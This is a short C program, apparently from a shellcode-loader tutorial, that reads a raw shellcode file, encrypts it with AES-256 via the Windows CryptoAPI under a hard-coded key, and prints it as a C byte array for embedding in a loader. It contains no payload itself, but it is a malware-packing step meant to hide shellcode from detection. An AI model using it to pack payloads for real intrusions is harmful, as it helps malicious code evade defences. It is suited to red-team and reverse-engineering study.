/*
    Generator
    Encryption with AES using CryptEncrypt

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcgenerate.cpp
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>
#include <stdio.h>

#pragma comment(lib,"advapi32")

#define KEY_SIZE    32

void encrypt (uint8_t * data, uint32_t size, uint8_t key[KEY_SIZE])
{
    HCRYPTPROV  h_provider;
    HCRYPTHASH  h_hash;
    HCRYPTKEY   h_key;
    DWORD       data_len = size;
    
    CryptAcquireContext (&h_provider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash (h_provider, CALG_SHA_512, 0, 0, &h_hash);
    CryptHashData (h_hash, key, KEY_SIZE, 0);
    CryptDeriveKey (h_provider, CALG_AES_256, h_hash, 0, &h_key);

    CryptEncrypt (h_key, 0, true, 0, data, &data_len, 2 * data_len);

    CryptDestroyKey (h_key);
    CryptDestroyHash (h_hash);
    CryptReleaseContext (h_provider, 0);
}


int main()
{
    HANDLE  f;
    SIZE_T  payload_len;
    DWORD   nread;

    uint8_t  *  payload;
    uint32_t    idx, nitem = 0;
    SIZE_T      remainder, multiple = 16;

    uint8_t     key[] = "Reversing.ID_ShellcodeLoader1337";

    // open existing file
    f = CreateFile ("shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // query the size and create enough space in heap
    payload_len = GetFileSize (f, NULL);
    remainder   = payload_len % multiple;
    if (remainder)
        payload_len += (multiple - remainder);
    nitem = 2 * payload_len / multiple;

    payload = (uint8_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * payload_len);

    // read the shellcode
    ReadFile(f, payload, payload_len, &nread, NULL);

    // encrypt the shellcode
    encrypt (payload, payload_len, key);

    // print
    printf("{");
    for (idx = 0; idx < payload_len; idx++)
    {
        if (idx % 16 == 0)
            printf("\n  ");
        
        printf("0x%02x, ", payload[idx]);
    }
    printf("\n}\n");
    printf ("Length: %lld\n", payload_len);

    // destroy heap
    HeapFree (GetProcessHeap(), 0, payload);

    return 0;
}